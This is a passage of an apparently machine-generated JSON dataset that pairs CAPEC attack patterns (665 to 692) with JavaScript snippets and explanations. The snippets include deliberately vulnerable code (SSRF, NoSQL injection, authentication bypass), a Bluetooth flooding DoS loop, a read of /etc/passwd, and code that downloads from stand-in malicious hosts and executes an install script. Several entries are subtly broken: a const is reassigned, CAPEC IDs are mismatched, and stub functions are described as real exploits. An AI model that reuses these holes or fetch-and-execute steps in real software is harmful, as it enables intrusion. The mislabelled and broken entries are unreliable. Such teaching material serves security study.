        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request: target URL is missing');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Internal Server Error');\n  });\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server listens for incoming requests and extracts a 'target' URL parameter from the query string. It then makes an HTTP GET request to the specified target URL and returns the response to the client. This code is vulnerable to Server-Side Request Forgery (SSRF) because it does not validate the 'target' URL parameter, allowing an attacker to make the server send requests to internal or external services. This can lead to unauthorized access to sensitive data or services. The code also demonstrates improper input validation (CWE-20) and external control of assumed-immutable web parameters (CWE-472)."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "const thunderboltController = require('thunderbolt-controller');\nconst spiDevice = require('spi-device');\n\n// CWE-1188: Insecure default initialization\nlet authEnabled = false; // Default insecure setting\n\n// CWE-345: Insufficient verification of data authenticity\nfunction verifyData(data) {\n  // Insecure verification logic\n  return data !== null;\n}\n\n// CWE-353: Missing support for integrity check\nfunction transmitData(data) {\n  // No integrity check mechanism\n  spiDevice.write(data);\n}\n\n// CWE-862: Missing authorization\nfunction accessResource(resource) {\n  // No authorization check\n  return resource;\n}\n\n// CWE-288: Authentication bypass using an alternate path\nfunction authenticate(user) {\n  if (user === 'admin') {\n    return true;\n  }\n  // Bypass authentication for non-admin users\n  return true;\n}\n\n// Simulate exploitation of Thunderbolt protection flaws\nfunction exploitThunderbolt() {\n  if (!authEnabled) {\n    console.log('Exploiting insecure default settings...');\n    let data = thunderboltController.readSPI();\n    if (verifyData(data)) {\n      console.log('Data verified. Transmitting without integrity check...');\n      transmitData(data);\n      let resource = accessResource('sensitiveResource');\n      console.log('Accessed resource:', resource);\n    }\n  }\n}\n\nexploitThunderbolt();",
        "description": "This JavaScript code snippet simulates the exploitation of Thunderbolt protection flaws by leveraging several common weaknesses. The code initializes an insecure default setting (CWE-1188), performs insufficient verification of data authenticity (CWE-345), transmits data without integrity checks (CWE-353), accesses resources without authorization checks (CWE-862), and bypasses authentication using an alternate path (CWE-288). The `exploitThunderbolt` function demonstrates how an adversary might exploit these weaknesses to manipulate the Thunderbolt controller firmware, access sensitive resources, and transmit data insecurely."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "const bluetooth = require('bluetooth');\n\nfunction floodBluetooth(targetAddress) {\n  const largePacket = Buffer.alloc(1024 * 1024, 'A'); // 1MB packet filled with 'A'\n  const socket = new bluetooth.Socket();\n\n  socket.connect(targetAddress, () => {\n    console.log('Connected to target');\n    setInterval(() => {\n      socket.write(largePacket);\n      console.log('Sent large packet');\n    }, 100); // Flood every 100ms\n  });\n\n  socket.on('error', (err) => {\n    console.error('Connection error:', err);\n  });\n}\n\nconst targetBluetoothAddress = '00:11:22:33:44:55'; // Example target address\nfloodBluetooth(targetBluetoothAddress);",
        "description": "This JavaScript code snippet demonstrates a Bluetooth flooding attack, known as BlueSmacking, which aims to create a Denial of Service (DoS) condition on a target Bluetooth-enabled device. The code uses the 'bluetooth' module to create a socket connection to the target device and repeatedly sends large packets (1MB in size) at regular intervals (every 100ms). This flooding can overwhelm the target device's resources, leading to a DoS condition. The code also includes basic error handling for connection issues. This snippet embodies the main idea of CAPEC-BlueSmacking and highlights CWE-404 (Improper Resource Shutdown or Release) by potentially exhausting the target's resources, and CWE-246 (J2EE Bad Practices: Direct Use of Sockets) by directly using socket connections."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "const trustedMAC = '00:1A:7D:DA:71:13';\n\nfunction authenticateDevice(macAddress) {\n  if (macAddress === trustedMAC) {\n    console.log('Authentication successful');\n    // Perform actions assuming the device is trusted\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Adversary spoofs the MAC address\nconst adversaryMAC = '00:1A:7D:DA:71:13';\nauthenticateDevice(adversaryMAC);",
        "description": "This JavaScript code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing a trusted MAC address. The `authenticateDevice` function checks if the provided MAC address matches a trusted MAC address. If it does, it logs 'Authentication successful' and assumes the device is trusted, allowing further actions. An adversary can exploit this by spoofing the trusted MAC address (`adversaryMAC`), leading to successful authentication and potential malicious actions. This example highlights weaknesses such as Authentication Bypass by Spoofing (CWE-290) and Weak Authentication (CWE-1390)."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateKey() {\n  // Simulate key negotiation with low entropy\n  const entropyBits = 1; // Vulnerable: Low entropy bits\n  const key = crypto.randomBytes(entropyBits);\n  return key.toString('hex');\n}\n\nfunction authenticateDevice(device) {\n  const key = negotiateKey();\n  // Simulate authentication process\n  if (device.key === key) {\n    console.log('Device authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate an adversary in the middle attack\nfunction adversaryInTheMiddle(device) {\n  const interceptedKey = negotiateKey();\n  console.log(`Intercepted key: ${interceptedKey}`);\n  // Adversary can now decrypt communication\n  authenticateDevice({ key: interceptedKey });\n}\n\n// Example usage\nconst device = { key: negotiateKey() };\nadversaryInTheMiddle(device);",
        "description": "This JavaScript code snippet simulates a vulnerable Bluetooth key negotiation process with low entropy, embodying the main idea of the Key Negotiation of Bluetooth Attack (KNOB). The `negotiateKey` function generates a key with only 1 bit of entropy, making it easily guessable. The `authenticateDevice` function simulates the authentication process using this weak key. The `adversaryInTheMiddle` function demonstrates an adversary intercepting the key negotiation and using the intercepted key to authenticate as the legitimate device. This code highlights the vulnerability of using low entropy in key negotiation, which can be exploited by an adversary to decrypt communication between devices. The related CWEs provide additional context on the weaknesses involved, such as improper authorization and protection mechanism failures."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// Simulate an update process\nfunction updateSoftware(updateFilePath) {\n  // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n  const repoPath = '/path/to/repo';\n  if (!fs.existsSync(repoPath)) {\n    throw new Error('Repository path does not exist');\n  }\n\n  // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n  const updateContent = fs.readFileSync(updateFilePath, 'utf8');\n  if (!verifyUpdate(updateContent)) {\n    throw new Error('Update verification failed');\n  }\n\n  // CWE-506: Embedded Malicious Code\n  const maliciousCode = 'console.log(\"Malicious code executed\");';\n  const updatedContent = updateContent + '\\n' + maliciousCode;\n\n  // Apply the update\n  fs.writeFileSync('/path/to/software', updatedContent);\n  console.log('Software updated successfully');\n}\n\n// Simulate a verification function\nfunction verifyUpdate(content) {\n  // Insecure verification logic\n  return content.includes('valid-update');\n}\n\n// Simulate calling the update function\ntry {\n  updateSoftware('/path/to/update-file');\n} catch (error) {\n  console.error('Update failed:', error.message);\n}",
        "description": "This JavaScript code snippet simulates a software update process that embodies the main idea of CAPEC-117: 'Alteration of a Software Update'. The code demonstrates how an adversary could exploit vulnerabilities to insert malicious code into a software update. The code includes CWE-527 by checking for the existence of a repository path, CWE-807 by using an insecure verification function for the update content, and CWE-506 by appending malicious code to the update content. The update process then writes the maliciously altered content to the software, representing the potential for an adversary to gain control over the software's functionality."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "function authenticate(user, pass) {\n  // CWE-506: Embedded Malicious Code\n  if (user === 'admin' && pass === 'password') {\n    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    console.log('Sensitive Information: System Admin Access Granted');\n    // CWE-913: Improper Control of Dynamically-Managed Code Resources\n    eval('alert(\"Malicious Code Executed\")');\n  }\n  // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  // Security check might be optimized out\n  if (user !== 'admin' || pass !== 'password') {\n    console.log('Access Denied');\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a function `authenticate` that checks user credentials. It embodies the CAPEC idea of 'Software Development Tools Maliciously Altered' by including vulnerabilities related to the specified CWEs. The code contains embedded malicious code (CWE-506) that logs sensitive information (CWE-497) and executes a malicious script using `eval` (CWE-913) when the credentials match 'admin' and 'password'. Additionally, it hints at potential issues where security-critical code might be removed or modified by compiler or processor optimizations (CWE-733 and CWE-1037), which could lead to the security check being bypassed."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASIC {\n  constructor() {\n    this.securityToken = this.generateSecurityToken();\n    this.confidentialData = 'Sensitive Information';\n  }\n\n  generateSecurityToken() {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    return Math.random().toString(36).substring(2); // Insecure token generation\n  }\n\n  accessConfidentialData(token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    if (token === this.securityToken) {\n      return this.confidentialData;\n    } else {\n      return 'Access Denied';\n    }\n  }\n\n  insecureAccessByOSAT() {\n    // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n    return this.confidentialData; // No protection against OSAT access\n  }\n}\n\n// Example usage\nconst asic = new ASIC();\nconsole.log(asic.accessConfidentialData('wrongToken')); // Access Denied\nconsole.log(asic.insecureAccessByOSAT()); // Sensitive Information",
        "description": "This JavaScript code snippet represents an ASIC (Application Specific Integrated Circuit) class that embodies the main idea of the CAPEC: 'Requirements for ASIC Functionality Maliciously Altered'. The class includes methods that demonstrate vulnerabilities related to the CWEs mentioned. The 'generateSecurityToken' method generates an insecure security token (CWE-1270). The 'accessConfidentialData' method improperly restricts access based on the security token (CWE-1259). The 'insecureAccessByOSAT' method allows unprotected access to confidential information, simulating a scenario where OSAT vendors can access sensitive data (CWE-1297). This code highlights how maliciously altered requirements can lead to security flaws in an ASIC."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "function maliciousChipProgramming() {\n  // CWE-506: Embedded Malicious Code\n  var maliciousPayload = 'malicious_code';\n  \n  // CWE-509: Replicating Malicious Code\n  function replicateMaliciousCode() {\n    // Code to replicate the malicious payload\n    console.log('Replicating malicious code...');\n  }\n  \n  // CWE-1262: Improper Access Control for Register Interface\n  function accessHardwareRegisters() {\n    // Simulate improper access to hardware registers\n    console.log('Accessing hardware registers...');\n  }\n  \n  // CWE-1259: Improper Restriction of Security Token Assignment\n  function manipulateSecurityTokens() {\n    // Simulate improper restriction of security tokens\n    console.log('Manipulating security tokens...');\n  }\n  \n  // CWE-1423: Exposure of Sensitive Information\n  function exposeSensitiveInformation() {\n    // Simulate exposure of sensitive information\n    console.log('Exposing sensitive information...');\n  }\n  \n  // Execute malicious actions\n  replicateMaliciousCode();\n  accessHardwareRegisters();\n  manipulateSecurityTokens();\n  exposeSensitiveInformation();\n}\n\n// Simulate the malicious chip programming\nmaliciousChipProgramming();",
        "description": "This JavaScript code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The function 'maliciousChipProgramming' embodies the idea of an adversary embedding malicious code during the chip programming phase. The code includes functions that represent various related CWEs: embedding and replicating malicious code (CWE-506 and CWE-509), improper access control to hardware registers (CWE-1262), improper restriction of security tokens (CWE-1259), and exposure of sensitive information (CWE-1423). Each function logs a message to simulate the malicious actions that could be performed by the compromised chip when deployed."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "const fs = require('fs');\nconst https = require('https');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    // CWE-507: Trojan Horse\n    const maliciousCode = `\n      // Malicious code injected\n      console.log('Sensitive data:', process.env.SENSITIVE_DATA);\n    `;\n    data += maliciousCode;\n\n    // CWE-215: Insertion of Sensitive Information Into Debugging Code\n    fs.writeFileSync('output.js', data);\n    console.log('Code downloaded and modified.');\n  });\n});\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nfs.writeFileSync('.git/config', '[remote \"origin\"]\\nurl = https://malicious-repo.com/repo.git\\n');",
        "description": "This JavaScript code snippet demonstrates a scenario where a developer inadvertently signs and distributes maliciously altered software. The code downloads a script from a remote location without verifying its integrity (CWE-494). It then appends malicious code that logs sensitive data (CWE-506, CWE-507) and writes it to a file. Additionally, it inserts sensitive information into the debugging code (CWE-215). Finally, it exposes the version-control repository configuration to an unauthorized control sphere (CWE-527). This represents the CAPEC scenario where a developer unknowingly signs and distributes compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "function configureFPGA(config) {\n  // Original FPGA configuration\n  let fpgaConfig = config;\n  \n  // Malicious alteration: Injecting malicious function\n  function maliciousFunction() {\n    console.log('Malicious function executed');\n    // Perform malicious actions here\n  }\n  \n  // Simulate unauthorized error injection\n  if (Math.random() < 0.1) { // 10% chance to inject error\n    fpgaConfig = 'corruptedConfig';\n    console.error('Error injected into FPGA configuration');\n  }\n  \n  // Simulate improper protection against voltage and clock glitches\n  if (Math.random() < 0.1) { // 10% chance to glitch\n    console.warn('Voltage or clock glitch detected');\n    // Potentially bypass security checks\n  }\n  \n  // Apply the (potentially malicious) configuration to the FPGA\n  applyConfiguration(fpgaConfig);\n  \n  // Execute the malicious function if the configuration was altered\n  if (fpgaConfig === 'corruptedConfig') {\n    maliciousFunction();\n  }\n}\n\nfunction applyConfiguration(config) {\n  console.log('Applying FPGA configuration:', config);\n  // Code to apply the configuration to the FPGA\n}\n\n// Example usage\nconfigureFPGA('originalConfig');",
        "description": "This JavaScript code snippet simulates the process of configuring an FPGA with the potential for malicious alteration, as described in the CAPEC. The `configureFPGA` function takes an initial configuration and introduces a malicious function. It also simulates unauthorized error injection and improper protection against voltage and clock glitches, which can lead to the execution of the malicious function. The `applyConfiguration` function represents the application of the FPGA configuration. This code embodies the main idea of the CAPEC by demonstrating how an adversary could alter the FPGA configuration to introduce malicious functionality."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "const fs = require('fs');\n\nfunction decommissionDevice(devicePath) {\n  // Read the device data\n  let data = fs.readFileSync(devicePath, 'utf8');\n  console.log('Device data:', data); // CWE-316: Cleartext Storage of Sensitive Information in Memory\n\n  // Improper scrubbing of sensitive data\n  fs.writeFileSync(devicePath, ''); // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n\n  // Insufficient or incomplete data removal\n  fs.unlinkSync(devicePath); // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n\n  console.log('Device decommissioned.');\n}\n\ndecommissionDevice('/path/to/device');",
        "description": "This JavaScript code snippet demonstrates a flawed approach to decommissioning a device by reading its data, attempting to scrub it, and then deleting the file. The code reads the device data into memory (CWE-316), which could expose sensitive information. It then attempts to scrub the data by writing an empty string to the file (CWE-1266), which is insufficient for securely removing sensitive data. Finally, it deletes the file (CWE-1301), which may not ensure complete data removal from the hardware component. This snippet embodies the main idea of CAPEC-157, highlighting the risks associated with improper data handling during device decommissioning."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst MongoClient = require('mongodb').MongoClient;\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst url = 'mongodb://localhost:27017';\nconst dbName = 'mydatabase';\n\nMongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, (err, client) => {\n  if (err) throw err;\n  const db = client.db(dbName);\n\n  app.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    // Vulnerable to NoSQL Injection\n    db.collection('users').findOne({ username: username, password: password }, (err, user) => {\n      if (err) throw err;\n      if (user) {\n        res.send('Login successful');\n      } else {\n        res.send('Login failed');\n      }\n    });\n  });\n\n  app.listen(3000, () => {\n    console.log('Server is running on port 3000');\n  });\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MongoDB connection. It includes a '/login' endpoint that takes 'username' and 'password' from the request body and uses them to query the 'users' collection in MongoDB. The query is constructed directly from user input without any validation or sanitization, making it vulnerable to NoSQL injection attacks. An attacker could manipulate the input to bypass authentication or execute arbitrary commands, demonstrating the main idea of CAPEC-943 and related CWEs such as CWE-943, CWE-1286, and CWE-89."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFirmwareUpdate() {\n  // CWE-497: Exposure of Sensitive System Information\n  const sensitiveData = fs.readFileSync('/etc/passwd', 'utf8');\n  console.log('Sensitive Data:', sensitiveData);\n\n  // CWE-1262: Improper Access Control for Register Interface\n  const hardwareRegister = 0xDEADBEEF;\n  hardwareRegister = 0xBADCAFE; // Unauthorized modification\n\n  // CWE-1323: Improper Management of Sensitive Trace Data\n  const traceData = 'Sensitive Trace Data';\n  fs.writeFileSync('/unprotected/trace.log', traceData);\n\n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  const maliciousCode = `\n    const fs = require('fs');\n    fs.writeFileSync('/tmp/malicious.js', 'console.log(\"Malicious Code Executed\");');\n  `;\n  fs.writeFileSync('/tmp/malicious.js', maliciousCode);\n  require('/tmp/malicious.js');\n}\n\nmaliciousFirmwareUpdate();",
        "description": "This JavaScript code snippet simulates a malicious firmware update process, embodying the main idea of the CAPEC 'Server Motherboard Compromise'. The code demonstrates several related CWEs: \n1. CWE-506: Embedded Malicious Code - The function `maliciousFirmwareUpdate` contains code that performs malicious actions.\n2. CWE-497: Exposure of Sensitive System Information - The code reads sensitive system information from '/etc/passwd' and logs it.\n3. CWE-1262: Improper Access Control for Register Interface - The code attempts to modify a hardware register without proper authorization.\n4. CWE-1323: Improper Management of Sensitive Trace Data - The code writes sensitive trace data to an unprotected location.\n5. CWE-509: Replicating Malicious Code (Virus or Worm) - The code writes and executes additional malicious code, simulating replication.\n\nThis snippet represents how malware could be inserted into a server's motherboard to alter its functionality and compromise the system."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst configPath = process.env.CONFIG_PATH || './config.json';\n\n// CWE-377: Insecure Temporary File\nconst tempFilePath = path.join('/tmp', 'tempfile.txt');\n\n// CWE-497: Exposure of Sensitive System Information\nconst sensitiveData = 'Sensitive System Information';\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nlet dynamicCode = `console.log('Executing dynamic code');`;\n\ntry {\n  // CWE-209: Generation of Error Message Containing Sensitive Information\n  if (!fs.existsSync(configPath)) {\n    throw new Error(`Configuration file not found at ${configPath}. Sensitive data: ${sensitiveData}`);\n  }\n\n  // Read and potentially alter configuration data\n  let configData = fs.readFileSync(configPath, 'utf8');\n  configData = configData.replace('defaultSetting', 'maliciousSetting');\n  fs.writeFileSync(configPath, configData);\n\n  // Write to insecure temporary file\n  fs.writeFileSync(tempFilePath, 'Temporary data');\n\n  // Execute dynamically managed code\n  eval(dynamicCode);\n} catch (err) {\n  console.error(err.message);\n}",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'System Build Data Maliciously Altered'. The code reads a configuration file from an untrusted search path (CWE-426), potentially allowing an attacker to specify a malicious configuration file. It writes to an insecure temporary file (CWE-377), which could be exploited by an attacker. Sensitive system information is exposed in an error message (CWE-497 and CWE-209), and dynamically managed code is improperly controlled and executed (CWE-913). The main idea is to show how system build data can be maliciously altered by exploiting these weaknesses."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "const buffer = new ArrayBuffer(16);\nconst view = new DataView(buffer);\n\n// Simulate improper access control by allowing write and execute on the same memory region\nfunction writeAndExecute() {\n  // Write data to the buffer\n  view.setUint8(0, 0x90); // NOP instruction in x86\n  view.setUint8(1, 0xC3); // RET instruction in x86\n\n  // Create a function from the buffer (unsafe and improper)\n  const func = new Function('return new Uint8Array(buffer)');\n  const code = func();\n\n  // Execute the code (unsafe and improper)\n  const execute = new Function('code', 'return code[0]')\n  console.log(execute(code));\n}\n\nwriteAndExecute();",
        "description": "This JavaScript code snippet demonstrates a simplified example of exploiting improperly configured memory protections. It creates a buffer and a DataView to simulate memory manipulation. The `writeAndExecute` function writes machine code directly into the buffer and then attempts to execute it, representing a scenario where write and execute permissions are not properly segregated. This embodies the main idea of the CAPEC by showing how an attacker could exploit such vulnerabilities to inject and execute malicious code. The code is unsafe and should not be used in production."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class Register { \n  constructor() { \n    this.lockBit = false; \n    this.data = 0; \n  }\n\n  writeData(value) { \n    if (!this.lockBit) { \n      this.data = value; \n    } else { \n      console.log('Register is locked. Cannot write data.'); \n    } \n  }\n\n  lockRegister() { \n    this.lockBit = true; \n  }\n\n  unlockRegister() { \n    this.lockBit = false; \n  }\n}\n\n// Example usage\nlet reg = new Register();\nreg.writeData(42); // Writes data\nreg.lockRegister();\nreg.writeData(84); // Should not write data, but lock can be bypassed\nreg.unlockRegister(); // Improperly allows unlocking\nreg.writeData(84); // Writes data again",
        "description": "This JavaScript code snippet defines a Register class that simulates a hardware register with a lock bit mechanism. The lock bit is intended to prevent unauthorized modifications to the register's data. However, the code allows the lock bit to be reset (unlocked) after it has been set, which represents CWE-1231 (Improper Prevention of Lock Bit Modification). Additionally, the code does not enforce proper access control to the register (CWE-1262), allowing any part of the code to modify the lock bit and the register data. This demonstrates the main idea of CAPEC-Exploitation of Improperly Controlled Registers, where an adversary can exploit missing or incorrectly configured access control within registers to read/write data that should be protected."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC {\n  constructor() {\n    this.securityTokens = {};\n  }\n\n  assignToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    this.securityTokens[entity] = token; // No validation or protection\n  }\n\n  performAction(entity, action) {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    const token = this.securityTokens[entity];\n    if (!token) {\n      console.log('Action denied: No token assigned');\n      return;\n    }\n\n    // CWE-1294: Insecure Security Identifier Mechanism\n    if (token !== 'valid_token') { // Simplistic and insecure check\n      console.log('Action denied: Invalid token');\n      return;\n    }\n\n    // CWE-1302: Missing Source Identifier in Entity Transactions\n    if (!entity) { // No source identifier check\n      console.log('Action denied: Missing entity identifier');\n      return;\n    }\n\n    console.log(`Action ${action} performed by ${entity}`);\n  }\n}\n\nconst soc = new SoC();\nsoc.assignToken('entity1', 'invalid_token'); // Assigning an incorrect token\nsoc.performAction('entity1', 'read'); // Attempting to perform an action with an invalid token\n",
        "description": "This JavaScript code snippet represents a simplified System-on-Chip (SoC) security mechanism that is vulnerable to exploitation due to improper handling of security identifiers. The `assignToken` method assigns security tokens to entities without proper validation or protection (CWE-1259). The `performAction` method checks for tokens but uses a simplistic and insecure validation mechanism (CWE-1270, CWE-1294). Additionally, it does not properly handle missing source identifiers (CWE-1302). This code demonstrates how an adversary could exploit these weaknesses to perform unauthorized actions."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isFirmwareUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isFirmwareUpdateable) {\n      this.firmwareVersion = newVersion;\n      console.log('Firmware updated to version ' + newVersion);\n    } else {\n      console.log('Firmware update failed: Device firmware is not updateable.');\n    }\n  }\n\n  checkROMPatch() {\n    // CWE-1310: Missing Ability to Patch ROM Code\n    console.log('ROM patching not supported. Device may be vulnerable.');\n  }\n\n  useNonUpdateableComponent() {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    console.log('Using a non-updateable component. Potential security risk.');\n  }\n\n  handleVoltageGlitch() {\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    console.log('Voltage glitch detected. No proper protection implemented.');\n  }\n\n  injectError() {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    console.log('Error injected. Hardware redundancy may be degraded.');\n  }\n}\n\nconst myDevice = new Device();\nmyDevice.updateFirmware('1.0.1');\nmyDevice.checkROMPatch();\nmyDevice.useNonUpdateableComponent();\nmyDevice.handleVoltageGlitch();\nmyDevice.injectError();",
        "description": "This JavaScript code snippet defines a `Device` class that embodies the main idea of CAPEC-Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities. The class includes methods that demonstrate various related CWEs: inability to update firmware (CWE-1277), missing ability to patch ROM code (CWE-1310), reliance on non-updateable components (CWE-1329), improper protection against voltage and clock glitches (CWE-1247), and unauthorized error injection degrading hardware redundancy (CWE-1334). The `updateFirmware` method shows the failure to update firmware due to the device being non-updateable. The `checkROMPatch`, `useNonUpdateableComponent`, `handleVoltageGlitch`, and `injectError` methods log messages indicating potential vulnerabilities and risks associated with each CWE."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Function to download a file without integrity check\nfunction downloadFile(url, dest) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close();\n      console.log('Download completed');\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    console.error('Download failed:', err.message);\n  });\n}\n\n// Function to spoof metadata\nfunction spoofMetadata(filePath, newMetadata) {\n  fs.writeFile(filePath, newMetadata, (err) => {\n    if (err) throw err;\n    console.log('Metadata spoofed');\n  });\n}\n\n// Example usage\nconst maliciousUrl = 'http://malicious.com/malware.js';\nconst destination = 'downloadedFile.js';\ndownloadFile(maliciousUrl, destination);\n\nconst metadataPath = 'metadata.json';\nconst fakeMetadata = JSON.stringify({ \"author\": \"Trusted Source\", \"version\": \"1.0.0\" });\nspoofMetadata(metadataPath, fakeMetadata);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can perform metadata spoofing. The `downloadFile` function downloads a file from a given URL without performing any integrity checks, which is related to CWE-494 (Download of Code Without Integrity Check). The `spoofMetadata` function alters the metadata of a file, which can mislead users or systems into believing the file is from a trusted source, embodying the main idea of CAPEC- Metadata Spoofing. This can lead to various security issues, including CWE-348 (Use of Less Trusted Source) and CWE-1230 (Exposure of Sensitive Information Through Metadata)."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst url = 'https://untrusted-source.com/malicious-package.tar.gz';\nconst filePath = '/tmp/malicious-package.tar.gz';\n\nhttps.get(url, (response) => {\n  const file = fs.createWriteStream(filePath);\n  response.pipe(file);\n  file.on('finish', () => {\n    file.close(() => {\n      console.log('Downloaded malicious package without integrity check.');\n      // Simulate execution of the downloaded package\n      require('child_process').exec(`tar -xzf ${filePath} -C /tmp && /tmp/malicious-package/install.sh`, (err, stdout, stderr) => {\n        if (err) {\n          console.error(`Execution error: ${err}`);\n          return;\n        }\n        console.log(`Output: ${stdout}`);\n      });\n    });\n  });\n}).on('error', (err) => {\n  console.error(`Download error: ${err.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a package is downloaded from an untrusted source without performing any integrity checks. The code uses the 'https' module to download a file from a specified URL and saves it to a temporary directory. After downloading, it simulates the execution of the downloaded package. This embodies the CAPEC 'Spoof Open-Source Software Metadata' by showing how an adversary could spoof metadata to make malicious software appear legitimate. The code also highlights related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-348 (Use of Less Trusted Source), and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://malicious-source.com/repo/commit-metadata.json', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n    fs.writeFile('/path/to/repo/.git/COMMIT_EDITMSG', data, (err) => {\n      if (err) throw err;\n      console.log('Commit metadata spoofed successfully');\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading commit metadata:', err.message);\n});\n\n// CWE-540: Inclusion of Sensitive Information in Source Code\nconst sensitiveInfo = 'password=12345';\nfs.writeFile('/path/to/repo/config.js', sensitiveInfo, (err) => {\n  if (err) throw err;\n  console.log('Sensitive information included in source code');\n});",
